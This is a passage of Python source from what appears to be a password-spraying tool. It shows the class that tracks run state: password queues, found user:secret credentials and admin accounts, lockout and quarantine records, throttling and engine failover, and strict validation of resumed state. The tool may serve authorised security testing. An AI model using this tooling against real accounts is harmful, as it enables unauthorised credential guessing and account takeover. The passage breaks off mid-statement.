        self._tmp_userlist_idx: int = 0
        self.active_process: Optional[subprocess.Popen] = None

        # Feature D: Automatic throttling on response stress
        self.conn_fail_history: List[int] = []
        self.delay_multiplier: float = 1.0

        # Feature E: Timeline visualization
        self.timeline_events: List[Dict] = []

        # Failover memory: engine health tracking
        self.engine_health: Dict[str, Dict] = {}
        self.known_bad_realms: List[str] = []
        self.working_realm: Optional[str] = None
        self.identity_filter_complete: bool = not (
            cfg.filter_disabled and not cfg.dry_run
        )

        # Stash cooldown/threshold config values for easy access
        self.cooldown_rounds = cfg.engine_cooldown_rounds
        self.transient_threshold = cfg.engine_transient_threshold

        self._configured_by_key: Dict[str, str] = {}
        self._configured_by_alias: Dict[str, str] = {}
        self._rebuild_configured_identity_maps()

        try:
            if cfg.resume:
                self._load()
            else:
                self._prepare_fresh_directory()
                self._init_queue()
            self._remove_unrequested_artifacts()
        except Exception:
            self.close()
            raise

    def _rebuild_configured_identity_maps(self) -> None:
        self._configured_by_key.clear()
        self._configured_by_alias.clear()
        for configured_user in self.cfg.users:
            key = canonical_identity(configured_user, self.cfg.domain)
            self._configured_by_key.setdefault(key, configured_user)
            for alias in _identity_aliases(configured_user, self.cfg.domain):
                self._configured_by_alias.setdefault(alias, configured_user)

    def set_effective_users(self, users: List[str]) -> None:
        """Replace a fresh run's source list with its enumerated identity set."""
        if self.cfg.resume or self.pair_ledger:
            raise RuntimeError("effective users can only be set before a fresh run dispatches")
        if not users:
            raise RuntimeError("effective user set cannot be empty")
        self.cfg.users = list(users)
        self._rebuild_configured_identity_maps()
        self.identity_filter_complete = True
        self.save()

    def _acquire_run_lock(self) -> None:
        """Hold an exclusive lock for the lifetime of this State instance."""
        lock_path = self.log_dir / ".run.lock"
        fd = os.open(lock_path, os.O_RDWR | os.O_CREAT, 0o600)
        os.fchmod(fd, 0o600)
        handle = os.fdopen(fd, "a+", encoding="utf-8")
        if fcntl is None:
            handle.close()
            raise RuntimeError(
                "this platform cannot provide the required exclusive run-directory lock"
            )
        try:
            fcntl.flock(handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError as exc:
            handle.close()
            raise RuntimeError(
                f"another {PRODUCT_NAME} process is already using {self.log_dir}"
            ) from exc
        handle.seek(0)
        handle.truncate()
        handle.write(f"pid={os.getpid()} started={datetime.datetime.now().isoformat()}\n")
        handle.flush()
        self._lock_handle = handle

    def close(self) -> None:
        """Release the output-directory lock."""
        handle = getattr(self, "_lock_handle", None)
        if handle is None:
            return
        try:
            if fcntl is not None:
                fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
        except (OSError, ValueError):
            pass
        try:
            handle.close()
        finally:
            self._lock_handle = None

    def __del__(self):
        self.close()

    def _prepare_fresh_directory(self) -> None:
        """Refuse accidental overwrite and clear stale generated artifacts explicitly."""
        generated_names = {
            STATE_FILE_NAME,
            AUDIT_LOG_NAME,
            TIMELINE_HTML_NAME,
            # Remove predecessor artifacts only after explicit --start-fresh.
            "authcadence.state.json",
            "authcadence.log",
            "authcadence-timeline.html",
            "spraygun.state.json",
            "spraygun-spray.log",
            "creds.txt",
            PASSWORD_CHANGES_FILE_NAME,
            "locked-out.txt",
            "used-passwords.txt",
            "active-users.txt",
            "results.json",
            "results.csv",
            "timeline.json",
            "spray-timeline.html",
        }
        existing = [self.log_dir / name for name in generated_names if (self.log_dir / name).exists()]
        if existing and not self.cfg.start_fresh:
            names = ", ".join(sorted(path.name for path in existing))
            raise RuntimeError(
                f"output directory already contains run artifacts ({names}); "
                "use --resume, --start-fresh, or a different --output directory"
            )
        if self.cfg.start_fresh:
            for path in existing:
                path.unlink()
            for pattern in (".users-*", ".secret-*", ".tmp-users-*"):
                for path in self.log_dir.glob(pattern):
                    if path.is_file():
                        path.unlink()

    def _remove_unrequested_artifacts(self) -> None:
        """Prevent reports from an earlier invocation looking current."""
        optional = {
            "results.json": self.cfg.export in {"json", "all"},
            "results.csv": self.cfg.export in {"csv", "all"},
            TIMELINE_HTML_NAME: self.cfg.timeline or self.cfg.export == "all",
            "spray-timeline.html": False,
            "active-users.txt": self.cfg.filter_disabled,
        }
        for name, requested in optional.items():
            path = self.log_dir / name
            if not requested and path.exists():
                path.unlink()

    def _init_queue(self):
        """Initialize password queue from file (full list)."""
        self.remaining_queue = [secret for secret in self.cfg.passwords if secret != ""]

        # Write header to overall log
        self._log_line(f"=== {PRODUCT_NAME} run started at {datetime.datetime.now().isoformat()} ===")
        self._log_line(f"Config: tool={self.cfg.tool}, protocol={self.cfg.protocol}, pth={self.cfg.pth_mode}")
        self._log_line(f"Passwords in queue: {len(self.remaining_queue)}")
        self._log_line("")
        # Start a genuinely fresh state even when the output directory was used
        # by an earlier non-resumed run. This also clears stale human-readable
        # result files before any credentials or lockouts are found.
        self.save()

    def _load(self):
        """Load existing state from resume."""
        if not self.state_file.exists():
            legacy_states = [
                self.log_dir / "authcadence.state.json",
                self.log_dir / "spraygun.state.json",
            ]
            legacy_state = next((path for path in legacy_states if path.exists()), None)
            if legacy_state is not None:
                raise RuntimeError(
                    f"legacy state ({legacy_state.name}) was found, but automatic state "
                    "migration is disabled; resume it with the compatible release or use "
                    "--start-fresh"
                )
            raise RuntimeError(
                f"--resume requested but state file is missing: {self.state_file}"
            )

        try:
            data = json.loads(
                self.state_file.read_text(encoding="utf-8"),
                object_pairs_hook=_reject_duplicate_json_keys,
                parse_constant=_reject_nonfinite_json_constant,
            )
            if not isinstance(data, dict):
                raise ValueError("state JSON is not an object")
        except (json.JSONDecodeError, ValueError, OSError) as e:
            stamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%S%f")
            corrupt_backup = self.state_file.with_name(
                f"{self.state_file.name}.corrupt-{stamp}"
            )
            try:
                shutil.copy2(self.state_file, corrupt_backup)
                os.chmod(corrupt_backup, 0o600)
                backup_note = f"; preserved a copy as {corrupt_backup.name}"
            except OSError:
                backup_note = ""
            raise RuntimeError(
                f"resume state is unreadable or corrupt ({e}){backup_note}; "
                "refusing to start a fresh spray"
            ) from e

        schema_version = data.get("schema_version")
        if schema_version != STATE_SCHEMA_VERSION:
            raise RuntimeError(
                "resume state has an unsupported or missing schema version "
                f"({schema_version!r}); expected {STATE_SCHEMA_VERSION}. "
                "Use a separate output directory or explicitly start fresh."
            )

        required_types = {
            "target": dict,
            "input_identity": dict,
            "used_passwords": list,
            "found_creds": dict,
            "credentials": list,
            "locked_users": list,
            "quarantined_users": dict,
            "lockout_signals": list,
            "attempted_matrix": dict,
            "pair_ledger": dict,
            "remaining_queue": list,
            "effective_users": list,
            "attempts_by_password": dict,
            "start_time": str,
            "conn_fail_history": list,
            "timeline_events": list,
            "engine_health": dict,
            "known_bad_realms": list,
        }
        for key, expected_type in required_types.items():
            if not isinstance(data.get(key), expected_type):
                raise RuntimeError(
                    f"resume state is invalid: {key!r} must be "
                    f"{expected_type.__name__}; refusing to spray"
                )

        required_scalar_fields = {
            "unknown_lockout_events",
            "acknowledged_lockouts",
            "completed_batches",
            "total_attempts",
            "total_dispatches",
            "delay_multiplier",
            "working_realm",
            "last_batch_completed_at",
            "identity_filter_complete",
        }
        missing_scalar_fields = sorted(required_scalar_fields.difference(data))
        if missing_scalar_fields:
            raise RuntimeError(
                "resume state is invalid: missing required field(s) "
                f"{', '.join(missing_scalar_fields)}; refusing to spray"
            )

        def nonnegative_int(field: str) -> int:
            value = data[field]
            if isinstance(value, bool) or not isinstance(value, int) or value < 0:
                raise RuntimeError(
                    f"resume state is invalid: {field} must be a nonnegative integer"
                )
            return value

        def validate_iso_timestamp(value: Any, field: str) -> str:
            if not isinstance(value, str) or not value:
                raise RuntimeError(f"resume state is invalid: {field} must be an ISO timestamp")
            try:
                parsed = datetime.datetime.fromisoformat(value)
            except ValueError as exc:
                raise RuntimeError(
                    f"resume state is invalid: {field} must be an ISO timestamp"
                ) from exc
            if parsed.tzinfo is not None:
                raise RuntimeError(
                    f"resume state is invalid: {field} must use local naive time"
                )
            return value

        def validate_optional_counter(value: Any, field: str) -> Optional[int]:
            if value is None:
                return None
            if isinstance(value, bool) or not isinstance(value, int) or value < 0:
                raise RuntimeError(
                    f"resume state is invalid: {field} must be null or a nonnegative integer"
                )
            return value

        if not all(isinstance(item, str) for item in data["used_passwords"]):
            raise RuntimeError("resume state is invalid: used_passwords contains a non-string")
        if not all(isinstance(item, str) for item in data["remaining_queue"]):
            raise RuntimeError("resume state is invalid: remaining_queue contains a non-string")
        used_set = set(data["used_passwords"])
        remaining_set = set(data["remaining_queue"])
        configured_secrets = set(self.cfg.passwords)
        if (
            len(used_set) != len(data["used_passwords"])
            or len(remaining_set) != len(data["remaining_queue"])
            or used_set & remaining_set
            or used_set | remaining_set != configured_secrets
        ):
            raise RuntimeError(
                "resume state secret queue is incomplete, duplicated, or inconsistent; "
                "refusing to spray"
            )

        saved_target = data.get("target")
        current_target = self._target_identity()
        if saved_target != current_target:
            raise RuntimeError(
                "resume state belongs to a different target or credential mode: "
                f"saved={saved_target}, current={current_target}. "
                "Use a different --output directory or --start-fresh."
            )

        saved_inputs = data.get("input_identity")
        raw_effective_users = data["effective_users"]
        if (
            not raw_effective_users
            or not all(isinstance(user, str) and user for user in raw_effective_users)
        ):
            raise RuntimeError("resume state effective identity set is malformed")
        effective_keys = [
            canonical_identity(user, self.cfg.domain)
            for user in raw_effective_users
        ]
        source_users = self.cfg.source_users or self.cfg.users
        source_keys = [
            canonical_identity(user, self.cfg.domain)
            for user in source_users
        ]
        if (
            len(set(effective_keys)) != len(effective_keys)
            or not set(effective_keys).issubset(set(source_keys))
        ):
            raise RuntimeError("resume state effective identity set is inconsistent")
        saved_source_hash = saved_inputs.get("source_users_sha256")
        if saved_source_hash != _sha256_json(source_keys):
            raise RuntimeError(
                "resume state does not match the current source identity set"
            )
        filter_complete = data["identity_filter_complete"]
        if not isinstance(filter_complete, bool):
            raise RuntimeError("resume state identity-filter phase is malformed")
        if not filter_complete and effective_keys != source_keys:
            raise RuntimeError("resume state has an inconsistent pending identity filter")
        self.identity_filter_complete = filter_complete
        self.cfg.users = list(raw_effective_users)
        self._rebuild_configured_identity_maps()

        current_inputs = self._input_identity()
        if saved_inputs != current_inputs:
            raise RuntimeError(
                "resume state does not match the current users, secrets, engine, "
                "or safety settings; refusing to risk repeated attempts"
            )

        self.used_passwords = list(data["used_passwords"])
        self.found_creds = {}
        self.locked_users = {
            item for item in data["locked_users"] if isinstance(item, str)
        }
        if len(self.locked_users) != len(data["locked_users"]):
            raise RuntimeError("resume state locked_users contains an invalid identity")
        saved_locked_keys = {
            canonical_identity(user, self.cfg.domain) for user in self.locked_users
        }
        if len(saved_locked_keys) != len(self.locked_users):
            raise RuntimeError(
                "resume state locked_users contains canonical duplicates"
            )
        configured_user_keys = {
            canonical_identity(user, self.cfg.domain) for user in self.cfg.users
        }
        raw_quarantined = data["quarantined_users"]
        allowed_quarantine_reasons = set(QUARANTINE_PRIORITY)
        for key, value in raw_quarantined.items():
            if not isinstance(key, str) or not isinstance(value, dict):
                raise RuntimeError("resume state quarantine record is malformed")
            raw_user = value.get("user")
            raw_reason = value.get("reason")
            raw_reasons = value.get("reasons")
            if (
                not isinstance(raw_user, str)
                or not isinstance(raw_reason, str)
                or not isinstance(raw_reasons, list)
                or not raw_reasons
                or not all(isinstance(reason, str) for reason in raw_reasons)
            ):
                raise RuntimeError("resume state quarantine record is malformed")
            reasons = set(raw_reasons)
            if (
                len(reasons) != len(raw_reasons)
                or raw_reason not in reasons
                or not reasons.issubset(allowed_quarantine_reasons)
            ):
                raise RuntimeError("resume state quarantine reasons are invalid")
            user_key = canonical_identity(raw_user, self.cfg.domain)
            if key != user_key or user_key not in configured_user_keys:
                raise RuntimeError("resume state quarantine identity key is inconsistent")
            expected_primary = min(
                reasons,
                key=lambda reason: QUARANTINE_PRIORITY[reason],
            )
            if raw_reason != expected_primary:
                raise RuntimeError("resume state quarantine priority is inconsistent")
            self.quarantined_users[key] = {
                "user": raw_user,
                "reason": raw_reason,
                "reasons": sorted(reasons),
            }
        raw_signals = data.get("lockout_signals", [])
        if not all(isinstance(item, dict) for item in raw_signals):
            raise RuntimeError("resume state lockout_signals contains an invalid event")
        self.lockout_signals = [dict(item) for item in raw_signals]
        self.unknown_lockout_events = nonnegative_int("unknown_lockout_events")
        self.acknowledged_lockouts = nonnegative_int("acknowledged_lockouts")
        self.completed_rounds = nonnegative_int("completed_batches")
        if self.completed_rounds > len(data["used_passwords"]):
            raise RuntimeError("resume state completed batch count is impossible")
        raw_last_batch_completed_at = data["last_batch_completed_at"]
        if raw_last_batch_completed_at is None:
            if self.completed_rounds:
                raise RuntimeError(
                    "resume state is missing its last completed-batch timestamp"
                )
            self.last_batch_completed_at = None
        else:
            self.last_batch_completed_at = validate_iso_timestamp(
                raw_last_batch_completed_at,
                "last_batch_completed_at",
            )
            if not self.completed_rounds:
                raise RuntimeError(
                    "resume state has a completed-batch timestamp without a batch"
                )
        # Quarantine is derived again from durable outcomes below. The saved
        # copy is validated above but never trusted as the sole safety record.
        self.quarantined_users = {}

        raw_matrix = data.get("attempted_matrix", {})
        saved_matrix: Dict[str, Set[str]] = {}
        for secret, users in raw_matrix.items():
            if not isinstance(secret, str) or not isinstance(users, list):
                raise RuntimeError("resume state attempted_matrix is malformed")
            if secret not in configured_secrets:
                raise RuntimeError("resume state attempted_matrix contains an unknown secret")
            if not all(isinstance(user, str) for user in users):
                raise RuntimeError("resume state attempted_matrix contains an invalid identity")
            if users:
                normalized_users = [
                    canonical_identity(user, self.cfg.domain) for user in users
                ]
                if len(set(normalized_users)) != len(normalized_users):
                    raise RuntimeError("resume state attempted_matrix contains duplicate identities")
                if not set(normalized_users).issubset(configured_user_keys):
                    raise RuntimeError("resume state attempted_matrix contains an unknown identity")
                saved_matrix[secret] = set(normalized_users)
        self.attempted_matrix = {}

        raw_ledger = data["pair_ledger"]
        expected_saved_matrix: Dict[str, Set[str]] = {}
        for secret, records in raw_ledger.items():
            if not isinstance(secret, str) or not isinstance(records, dict):
                raise RuntimeError("resume state pair ledger is malformed")
            if secret not in configured_secrets:
                raise RuntimeError("resume state pair ledger contains an unknown secret")
            ledger_for_secret: Dict[str, Dict[str, Any]] = {}
            for key, record in records.items():
                if not isinstance(key, str) or not isinstance(record, dict):
                    raise RuntimeError("resume state pair ledger record is malformed")
                raw_user = record.get("user", key)
                raw_status = record.get("status", "indeterminate")
                if not isinstance(raw_user, str) or not isinstance(raw_status, str):
                    raise RuntimeError("resume state pair ledger record is malformed")
                normalized = dict(record)
                normalized["user"] = raw_user
                normalized["status"] = raw_status
                if key != canonical_identity(normalized["user"], self.cfg.domain):
                    raise RuntimeError("resume state pair ledger identity key is inconsistent")
                if key not in configured_user_keys:
                    raise RuntimeError("resume state pair ledger contains an unknown identity")
                if normalized["status"] not in TERMINAL_PAIR_STATUSES | {"in_flight"}:
                    raise RuntimeError("resume state pair ledger contains an invalid status")
                dispatch_count = record.get("dispatch_count", 1)
                if isinstance(dispatch_count, bool) or not isinstance(dispatch_count, int) or dispatch_count < 1:
                    raise RuntimeError("resume state pair ledger contains an invalid dispatch count")
                normalized["dispatch_count"] = dispatch_count
                for text_field in ("engine", "protocol", "detail", "previous_status"):
                    if text_field in record and not isinstance(record[text_field], str):
                        raise RuntimeError(
                            f"resume state pair ledger contains an invalid {text_field}"
                        )
                for timestamp_field in ("started_at", "updated_at"):
                    if timestamp_field in record:
                        validate_iso_timestamp(
                            record[timestamp_field],
                            f"pair_ledger.{timestamp_field}",
                        )
                for source_field in ("source_pass", "source_batch"):
                    if source_field in record:
                        validate_optional_counter(
                            record[source_field],
                            f"pair_ledger.{source_field}",
                        )
                original_status = normalized["status"]
                if original_status in TERMINAL_PAIR_STATUSES:
                    expected_saved_matrix.setdefault(secret, set()).add(key)
                if normalized["status"] == "in_flight":
                    normalized["status"] = "indeterminate"
                    normalized["detail"] = "process ended before a terminal result was persisted"
                    self._quarantine(normalized["user"], "indeterminate")
                ledger_for_secret[key] = normalized
                if normalized["status"] in TERMINAL_PAIR_STATUSES:
                    self.attempted_matrix.setdefault(secret, set()).add(normalized["user"])
            self.pair_ledger[secret] = ledger_for_secret

        if saved_matrix != expected_saved_matrix:
            raise RuntimeError(
                "resume state attempted_matrix does not match the authoritative pair ledger"
            )

        self.success_by_pattern = {}
        self.admin_users = {}

        for record in data["credentials"]:
            if not isinstance(record, dict):
                raise RuntimeError("resume state credential record is malformed")
            user = record.get("user")
            secret = record.get("secret")
            if not isinstance(user, str) or not isinstance(secret, str):
                raise RuntimeError("resume state credential record lacks user or secret")
            if not isinstance(record.get("is_admin"), bool):
                raise RuntimeError("resume state credential record has an invalid admin flag")
            credential_state = record.get("credential_state")
            if credential_state not in CREDENTIAL_STATES:
                raise RuntimeError("resume state credential record has an invalid state")
            if record["is_admin"] and credential_state != "valid":
                raise RuntimeError("resume state admin credential has an invalid state")
            if canonical_identity(user, self.cfg.domain) not in configured_user_keys:
                raise RuntimeError("resume state credential record contains an unknown identity")
            if secret not in configured_secrets:
                raise RuntimeError("resume state credential record contains an unknown secret")
            pair = (canonical_identity(user, self.cfg.domain), secret)
            if pair in self._credential_index:
                raise RuntimeError("resume state contains a duplicate credential pair")
            ledger_record = self.pair_ledger.get(secret, {}).get(pair[0])
            if ledger_record is not None:
                ledger_status = ledger_record.get("status")
                expected_status = credential_state
                if credential_state == "valid":
                    expected_status = (
                        "admin_success" if record["is_admin"] else "success"
                    )
                if ledger_status != expected_status:
                    raise RuntimeError(
                        "resume state credential finding conflicts with the pair ledger"
                    )
            captured_at = validate_iso_timestamp(
                record.get("captured_at"),
                "credentials.captured_at",
            )
            for source_field in ("source_round", "source_pass", "source_batch"):
                if source_field in record:
                    validate_optional_counter(
                        record[source_field],
                        f"credentials.{source_field}",
                    )
            if not isinstance(record.get("engine", ""), str):
                raise RuntimeError("resume state credential record has an invalid engine")
            normalized = {
                "user": user,
                "secret": secret,
                "is_admin": record["is_admin"],
                "credential_state": credential_state,
                "captured_at": captured_at,
                "source_round": record.get("source_round"),
                "source_pass": record.get("source_pass", record.get("source_round")),
                "source_batch": record.get("source_batch", record.get("source_round")),
                "engine": record.get("engine", ""),
            }
            self.credentials.append(normalized)
            self._credential_index[pair] = normalized
            self.found_creds[user] = secret
            self._quarantine(user, "credential_found")
            if normalized["is_admin"]:
                self.admin_users[user] = secret

        if not all(
            isinstance(user, str) and isinstance(secret, str)
            for user, secret in data["found_creds"].items()
        ):
            raise RuntimeError("resume state found_creds is malformed")
        if data["found_creds"] != self.found_creds:
            raise RuntimeError(
                "resume state found_creds does not match credential findings"
            )

        seen_signal_identities: Set[Tuple[str, str]] = set()
        calculated_unknown_signals = 0
        for event in self.lockout_signals:
            certainty = event.get("certainty")
            if certainty not in {"definitive", "ambiguous"}:
                raise RuntimeError("resume state contains an invalid safety-signal certainty")
            validate_iso_timestamp(event.get("ts"), "lockout_signals.ts")
            for text_field in ("engine", "protocol", "raw"):
                if not isinstance(event.get(text_field, ""), str):
                    raise RuntimeError(
                        f"resume state safety signal contains an invalid {text_field}"
                    )
            for source_field in ("source_pass", "source_batch"):
                if source_field not in event:
                    raise RuntimeError(
                        f"resume state safety signal is missing {source_field}"
                    )
                validate_optional_counter(
                    event[source_field],
                    f"lockout_signals.{source_field}",
                )
            stage = event.get("stage")
            if stage not in {"spray", "identity_enumeration"}:
                raise RuntimeError("resume state safety signal contains an invalid stage")
            event_secret = event.get("secret")
            if (
                stage == "spray"
                and event_secret not in configured_secrets
            ) or (
                stage == "identity_enumeration"
                and event_secret is not None
            ):
                raise RuntimeError("resume state safety signal contains an unknown secret")
            event_user = event.get("user")
            if event_user is None:
                calculated_unknown_signals += 1
                continue
            if not isinstance(event_user, str):
                raise RuntimeError("resume state safety signal contains an invalid identity")
            event_key = canonical_identity(event_user, self.cfg.domain)
            if event_key not in configured_user_keys:
                raise RuntimeError("resume state safety signal contains an unknown identity")
            if stage == "spray":
                ledger_record = self.pair_ledger.get(str(event_secret), {}).get(
                    event_key
                )
                expected_status = (
                    "lockout" if certainty == "definitive" else "ambiguous_lockout"
                )
                if (
                    ledger_record is not None
                    and ledger_record.get("status") != expected_status
                ):
                    raise RuntimeError(
                        "resume state safety signal conflicts with the pair ledger"
                    )
            dedupe_key = (event_key, str(certainty))
            if dedupe_key in seen_signal_identities:
                raise RuntimeError("resume state contains duplicate known safety signals")
            seen_signal_identities.add(dedupe_key)
            if certainty == "definitive":
                self.locked_users.add(self._display_user(event_user))
                self._quarantine(event_user, "confirmed_lockout")
            else:
                self._quarantine(event_user, "ambiguous_lockout_signal")

        if calculated_unknown_signals != self.unknown_lockout_events:
            raise RuntimeError("resume state unknown safety-signal count is inconsistent")

        # Terminal ledger outcomes are authoritative. Reconstruct global
        # quarantine/findings if a process died after persisting the pair but
        # before its corresponding aggregate record was atomically published.
        for secret, records in self.pair_ledger.items():
            for record in records.values():
                user = str(record["user"])
                status = str(record["status"])
                if status in SUCCESS_PAIR_STATUSES:
                    credential_state = (
                        status
                        if status in PASSWORD_CHANGE_PAIR_STATUSES
                        else "valid"
                    )
                    added = self.add_cred(
                        user,
                        secret,
                        is_admin=status == "admin_success",
                        credential_state=credential_state,
                        source_round=record.get("source_batch"),
                        engine=str(record.get("engine", "")),
                        persist=False,
                    )
                    if added:
                        finding = self._credential_index[
                            (canonical_identity(user, self.cfg.domain), secret)
                        ]
                        finding["source_pass"] = record.get("source_pass")
                        finding["source_batch"] = record.get("source_batch")
                elif status == "lockout":
                    self.add_lockout(
                        user,
                        certainty="definitive",
                        engine=str(record.get("engine", "")),
                        protocol=str(record.get("protocol", "")),
                        secret=secret,
                        raw_line="recovered from pair ledger",
                        source_pass=record.get("source_pass"),
                        source_batch=record.get("source_batch"),
                        persist=False,
                    )
                elif status == "ambiguous_lockout":
                    self.add_lockout(
                        user,
                        certainty="ambiguous",
                        engine=str(record.get("engine", "")),
                        protocol=str(record.get("protocol", "")),
                        secret=secret,
                        raw_line="recovered from pair ledger",
                        source_pass=record.get("source_pass"),
                        source_batch=record.get("source_batch"),
                        persist=False,
                    )
                elif status == "indeterminate":
                    self._quarantine(user, "indeterminate")

        definitive_signal_keys = {
            canonical_identity(str(event["user"]), self.cfg.domain)
            for event in self.lockout_signals
            if event.get("user") and event.get("certainty") == "definitive"
        }
        if not saved_locked_keys.issubset(definitive_signal_keys):
            raise RuntimeError(
                "resume state locked identities are not backed by definitive signal evidence"
            )
        if not 0 <= self.acknowledged_lockouts <= self.lockout_count:
            raise RuntimeError("resume state acknowledged safety-signal count is invalid")

        self.success_by_pattern = {}
        for finding in self.credentials:
            pattern = classify_password_pattern(str(finding["secret"]))
            self.success_by_pattern[pattern] = self.success_by_pattern.get(pattern, 0) + 1

        for user in self.locked_users:
            if canonical_identity(user, self.cfg.domain) not in configured_user_keys:
                raise RuntimeError("resume state contains an unknown locked identity")
            self._quarantine(user, "confirmed_lockout")

        self.start_time = validate_iso_timestamp(data["start_time"], "start_time")
        self.total_attempts = nonnegative_int("total_attempts")
        self.total_dispatches = nonnegative_int("total_dispatches")
        raw_attempts_by_password = data["attempts_by_password"]
        for secret, count in raw_attempts_by_password.items():
            if (
                not isinstance(secret, str)
                or secret not in configured_secrets
                or isinstance(count, bool)
                or not isinstance(count, int)
                or count < 0
            ):
                raise RuntimeError("resume state attempts_by_password is malformed")
        self.attempts_by_password = dict(raw_attempts_by_password)

        # Response-stress throttling is safety-sensitive: validate the history
        # and require the saved multiplier to be exactly derivable from it.
        self.conn_fail_history = list(data["conn_fail_history"])
        if not all(
            not isinstance(count, bool) and isinstance(count, int) and count >= 0
            for count in self.conn_fail_history
        ):
            raise RuntimeError("resume state connection-failure history is malformed")
        if len(self.conn_fail_history) > self.completed_rounds:
            raise RuntimeError("resume state connection-failure history is inconsistent")
        expected_delay_multiplier = 1.0
        for count in self.conn_fail_history:
            if count > 0:
                expected_delay_multiplier = min(expected_delay_multiplier * 1.5, 3.0)
            else:
                expected_delay_multiplier = max(expected_delay_multiplier - 0.25, 1.0)
        raw_delay_multiplier = data["delay_multiplier"]
        if (
            isinstance(raw_delay_multiplier, bool)
            or not isinstance(raw_delay_multiplier, (int, float))
            or not math.isfinite(float(raw_delay_multiplier))
            or not math.isclose(
                float(raw_delay_multiplier),
                expected_delay_multiplier,
                rel_tol=0.0,
                abs_tol=1e-9,
            )
        ):
            raise RuntimeError("resume state throttle multiplier is inconsistent")
        self.delay_multiplier = expected_delay_multiplier

        # Timeline data is not trusted as executable state, but malformed
        # entries can still break reporting or disguise the audit sequence.
        self.timeline_events = []
        for event in data["timeline_events"]:
            if not isinstance(event, dict):
                raise RuntimeError("resume state timeline contains a malformed event")
            validate_iso_timestamp(event.get("ts"), "timeline_events.ts")
            if not isinstance(event.get("type"), str) or not isinstance(
                event.get("detail"), str
            ):
                raise RuntimeError("resume state timeline contains a malformed event")
            validate_optional_counter(event.get("batch"), "timeline_events.batch")
            self.timeline_events.append(dict(event))

        # Failover cooldown memory controls whether an engine may run. Reject
        # any record that could reset, shorten, or ambiguously represent it.
        allowed_engine_keys = {
            str(engine) for engine in build_failover_chain(self.cfg)
        }
        required_health_fields = {
            "consecutive_failures",
            "demoted",
            "cooldown_remaining",
            "demote_count",
            "last_reason",
        }
        self.engine_health = {}
        for engine_key, health in data["engine_health"].items():
            if (
                not isinstance(engine_key, str)
                or engine_key not in allowed_engine_keys
                or not isinstance(health, dict)
                or set(health) != required_health_fields
            ):
                raise RuntimeError("resume state engine-health record is malformed")
            consecutive_failures = health["consecutive_failures"]
            cooldown_remaining = health["cooldown_remaining"]
            demote_count = health["demote_count"]
            demoted = health["demoted"]
            last_reason = health["last_reason"]
            integer_values = (
                consecutive_failures,
                cooldown_remaining,
                demote_count,
            )
            if (
                any(
                    isinstance(value, bool)
                    or not isinstance(value, int)
                    or value < 0
                    for value in integer_values
                )
                or not isinstance(demoted, bool)
                or not isinstance(last_reason, str)
                or cooldown_remaining > max(MAX_COOLDOWN, self.cooldown_rounds)
                or demote_count > MAX_DEMOTE_COUNT
                or (
                    demoted
                    and (demote_count < 1 or consecutive_failures < 1 or not last_reason)
                )
                or (
                    not demoted
                    and (cooldown_remaining != 0 or demote_count != 0)
                )
            ):
                raise RuntimeError("resume state engine-health record is inconsistent")
            self.engine_health[engine_key] = dict(health)

        realm_candidates = set(
            self.cfg.realm_candidates or derive_realm_candidates(self.cfg.domain)
        )
        raw_bad_realms = data["known_bad_realms"]
        if (
            not all(isinstance(realm, str) and realm for realm in raw_bad_realms)
            or len(set(raw_bad_realms)) != len(raw_bad_realms)
            or not set(raw_bad_realms).issubset(realm_candidates)
        ):
            raise RuntimeError("resume state rejected-realm memory is malformed")
        raw_working_realm = data["working_realm"]
        if raw_working_realm is not None and (
            not isinstance(raw_working_realm, str)
            or raw_working_realm not in realm_candidates
            or raw_working_realm in raw_bad_realms
        ):
            raise RuntimeError("resume state working-realm memory is malformed")
        self.known_bad_realms = list(raw_bad_realms)
        self.working_realm = raw_working_realm

        self.remaining_queue = list(data["remaining_queue"])

        # A fully used pass may omit a pair only when the identity was already
        # quarantined. Otherwise the state would silently claim unperformed
        # work was complete.
        for secret in self.used_passwords:
            ledger = self.pair_ledger.get(secret, {})
            for user in self.cfg.users:
                key = canonical_identity(user, self.cfg.domain)
                if key not in ledger and key not in self.quarantined_users:
                    raise RuntimeError(
                        "resume state marks a secret used but has neither an outcome "
                        "nor a quarantine decision for every identity"
                    )

        if self.remaining_queue:
            self.current_batch_progress()

        self._log_line(f"=== Resuming from saved state at {datetime.datetime.now().isoformat()} ===")
        self._log_line(f"Used passwords: {len(self.used_passwords)}, remaining: {len(self.remaining_queue)}")
        self._log_line(f"Credential matrix loaded: {sum(len(v) for v in self.attempted_matrix.values())} pairs")
        self._log_line("")
        # Persist any in-flight-to-indeterminate normalization immediately.
        self.save()

    def save(self):
        """Persist state to disk."""
        self.reconcile_ledger_metrics()
        data = {
            "schema_version": STATE_SCHEMA_VERSION,
            "target": self._target_identity(),
            "input_identity": self._input_identity(),
            "used_passwords": self.used_passwords,
            "remaining_queue": self.remaining_queue,
            "effective_users": self.cfg.users,
            "found_creds": self.found_creds,
            "credentials": self.credentials,
            "locked_users": list(self.locked_users),
            "quarantined_users": self.quarantined_users,
            "lockout_signals": self.lockout_signals,
            "unknown_lockout_events": self.unknown_lockout_events,
            "acknowledged_lockouts": self.acknowledged_lockouts,
            "completed_batches": self.completed_rounds,
            "last_batch_completed_at": self.last_batch_completed_at,
            # New fields for operator fundamentals
            "attempted_matrix": {k: list(v) for k, v in self.attempted_matrix.items()},
            "pair_ledger": self.pair_ledger,
            "success_by_pattern": self.success_by_pattern,
            "admin_users": self.admin_users,
            "start_time": self.start_time,
            "total_attempts": self.total_attempts,
            "total_dispatches": self.total_dispatches,
            "attempts_by_password": self.attempts_by_password,
            # Feature D: Throttling
            "conn_fail_history": self.conn_fail_history,
            "delay_multiplier": self.delay_multiplier,
            # Feature E: Timeline
            "timeline_events": self.timeline_events,
            # Failover memory
            "engine_health": self.engine_health,
            "known_bad_realms": self.known_bad_realms,
            "working_realm": self.working_realm,
            "identity_filter_complete": self.identity_filter_complete,
        }
        self._atomic_write_text(self.state_file, json.dumps(data, indent=2) + "\n")

        # Also write human-readable files
        creds_lines = [f"{item['user']}:{item['secret']}" for item in self.credentials]
        self._atomic_write_text(self.creds_file, "\n".join(creds_lines) + ("\n" if creds_lines else ""))

        password_change_sections: List[str] = []
        for finding in self.password_change_findings():
            password_change_sections.extend([
                f"Status: {credential_state_label(str(finding['credential_state']))}",
                f"Credential: {finding['user']}:{finding['secret']}",
                f"Command: {self.password_change_command(finding)}",
                "",
            ])
        self._atomic_write_text(
            self.password_changes_file,
